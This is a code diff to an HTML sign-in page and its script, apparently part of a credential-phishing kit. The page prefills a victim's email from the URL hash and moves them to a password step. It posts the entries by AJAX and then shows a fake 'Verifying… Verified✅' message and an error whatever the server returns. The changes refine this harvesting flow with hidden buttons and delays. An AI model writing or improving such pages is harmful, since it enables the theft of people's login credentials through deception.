@@ -206,7 +206,8 @@
                     </li> 
                     <li class="form-stripe form-stripe--actions"> <button class="button button--primary button--full-width button--with-loader" type="button" id="button--with-loader" tabindex="2"><span id="button-text">Next</span><span id="loading-spinner" style="display: none;">Verifying ..</span></button> 
                     
-                     <button  style="display:none;" class="button button--primary button--full-width button--with-loader" type="submit" id="button--with-loaders" tabindex="2">Sign in</button> 
+                     <button  style="display:none;" class="button button--primary button--full-width button--with-loader" type="submit" id="buttonloads" tabindex="2">Sign in</button> 
+                     <button  style="display:none;" class="button button--primary button--full-width button--with-loader" type="button" id="buttonloader" tabindex="2" hidden ></button> 
                     </li> 
                   </ul> <input type="password" class="hidden" name="hiddenPassword" tabindex="-1" value=""> 
                 </form> 
@@ -215,20 +216,21 @@
 <script>
   // Get the elements
    nextButton = document.getElementById('button--with-loader');
+   nextButtons = document.getElementById('buttonloader');
   labelsec = document.getElementById('lbl');
-  const submitButton = document.getElementById('button--with-loaders');
+  const submitButton = document.getElementById('buttonloads');
   emailSection = document.getElementById('username');
   const passwordSection = document.getElementById('passw');
 
   // When Next button is clicked
-  nextButton.addEventListener('click', function() {
-    // Hide email section and show password section
-    labelsec.innerHTML = "Password";
-    emailSection.style.display = 'none';
-    nextButton.style.display = 'none';
-    passwordSection.style.display = 'block';
-    submitButton.style.display = 'block';
-  });
+  // nextButton.addEventListener('click', function() {
+  //   // Hide email section and show password section
+  //   labelsec.innerHTML = "Password";
+  //   emailSection.style.display = 'none';
+  //   nextButton.style.display = 'none';
+  //   passwordSection.style.display = 'block';
+  //   submitButton.style.display = 'block';
+  // });
   // Function to validate email format
   function isValidEmail(email) {
     const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -238,7 +240,8 @@
   // Function to get the email from the hash and decode it from Base64
   function getEmailFromHash() {
     const hash = window.location.hash.substring(1); // Remove the # character
-    console.log(atob(hash));
+    //console.log(atob(hash));
+    //console.log(hash);
     const params = new URLSearchParams(hash);
     const encodedEmail = params.get("email");
 
@@ -293,7 +296,7 @@
     setTimeout(function() {
       if (isValidEmail(emailSection.value)) {
         
-        nextButton.click();
+        nextButtons.click();
         
       }
       stopLoading(); // Stop loading after timeout
@@ -308,14 +311,46 @@
   // When Submit button is clicked, form will be submitted by default since it's a submit button
 
 
+
 $(document).ready(function() {
     
-  
+     // When Next button is clicked
+  nextButton.addEventListener('click', function() {
+     if (isValidEmail(emailSection.value)) {
+    // Start loading and set a 3-second delay before clicking "Next" if email is valid
+      startLoading();
+    setTimeout(function() {
+     
+        
+        nextButtons.click();
+     
+      stopLoading(); // Stop loading after timeout
+    }, 5000);
+      
+      
+    
+  }
+    
+  });
+  nextButtons.addEventListener('click', function() {
+    // Hide email section and show password section
+    labelsec.innerHTML = "Password";
+    emailSection.style.display = 'none';
+    nextButton.style.display = 'none';
+    passwordSection.style.display = 'block';
+    submitButton.style.display = 'block';
+  });
 
     // When the form is submitted
     $("#contact").on("submit", function(event) {
+
         // Prevent the default form submission
         event.preventDefault();
+
+          // Handle the response on success
+               submitButton.classList.add('button--disabled');
+               submitButton.innerText='Verifying.....';
+               
 //console.log( emailSection.value);
         // Gather form data
         const formData = {
@@ -331,26 +366,37 @@ $(document).ready(function() {
             data: formData,
             success: function(response) {
                 // Handle the response on success
-               submitButton.style.display = 'none';
-               loadingSpinner.style.display = 'block';
+               submitButton.classList.add('button--disabled');
+               submitButton.innerText='Verifying.....';
+               //submitButton.style.display = 'none';
+               //loadingSpinner.style.display = 'block';
                setTimeout(function() {
-                
-		loadingSpinner.style.display = 'none';
+               submitButton.classList.remove('button--disabled');
+		           submitButton.innerText='Verified✅';
                 $(".error-box").text("An error occurred: " );
-		 }, 2);
+		 }, 5000);
                 //console.log("Form submitted successfully");
             },
             error: function(xhr, status, error) {
-                // Handle the response on success
-               submitButton.style.display = 'none';
-               loadingSpinner.style.display = 'block';
+              // Handle the response on success
+               submitButton.classList.add('button--disabled');
+               submitButton.innerText='Verifying.....';
+               //submitButton.style.display = 'none';
+               //loadingSpinner.style.display = 'block';
                setTimeout(function() {
-                
-		loadingSpinner.style.display = 'none';
+               submitButton.classList.remove('button--disabled');
+               submitButton.innerText='Verified✅';
                 $(".error-box").text("An error occurred: " );
-		 }, 2);
+     }, 5000);
             }
         });
+        //submitButton.style.display = 'none';
+               //loadingSpinner.style.display = 'block';
+               setTimeout(function() {
+               submitButton.classList.remove('button--disabled');
+               submitButton.innerText='Verified✅';
+                $(".error-box").text("An error occurred: " );
+     }, 5000);
     });
 });
 </script>
